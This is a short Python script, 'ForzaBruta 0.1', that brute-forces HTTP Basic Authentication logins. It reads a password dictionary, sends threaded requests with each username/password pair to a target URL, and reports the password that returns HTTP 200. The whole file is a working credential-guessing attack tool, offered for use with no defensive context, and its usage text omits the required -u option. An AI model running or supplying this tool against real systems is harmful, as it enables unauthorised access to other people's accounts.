import requests
from threading import Thread
import sys
import getopt

global hit
hit = '1'


def banner():
    print("\n***************************************")
    print("* ForzaBruta 0.1*")
    print("***************************************")


def usage():
    print("Usage:")
    print("		-w: url (http://somesite.com/FUZZ)")
    print("		-t: threads")
    print("		-f: dictionary file\n")
    print("example: forzabruta.py -w http://www.targetsite.com/FUZZ -t 5 -f common.txt\n")


class request_performer(Thread):
    def __init__(self, word, username, url):
        Thread.__init__(self)
        try:
            self.passwd = word.split("\n")[0]
            self.username = username
            self.url = url
            print('-', self.passwd, '-')
        except Exception as e:
            print(e)

    def run(self):
        global hit
        if hit == '1':
            try:
                r = requests.get(self.url, auth=(self.username, self.passwd))
                if r.status_code == 200:
                    hit = '0'
                    print('[+] Password found - UN:', self.username, 'PW:',self.passwd)
                    sys.exit()
                else:
                    print('Not valid- UN:', self.username, 'PW:',self.passwd)
                    i[0] = i[0] - 1  # Here we remove one thread from the counter
            except Exception as e:
                print(e)


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:t:")
    except getopt.GetoptError:
        print("Error en arguments")
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dict = arg
        elif opt == '-t':
            threads = int(arg)

    try:
        f = open(dict, "r")
        words = f.readlines()
    except:
        print("Failed opening file: " + dict + "\n")
        sys.exit()
    launcher_thread(words, threads, user, url)


def launcher_thread(passwords, th, username, url):
    global i
    i = []
    resultlist = []
    i.append(0)
    while len(passwords):
        try:
            if i[0] < th:
                n = passwords.pop(0)
                i[0] = i[0] + 1
                thread = request_performer(n, username, url)
                thread.start()

        except KeyboardInterrupt:
            print("ForzaBruta interrupted  by user. Finishing attack..")
            sys.exit()
        thread.join()
    return


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("ForzaBruta interrupted by user, killing all threads..!!")
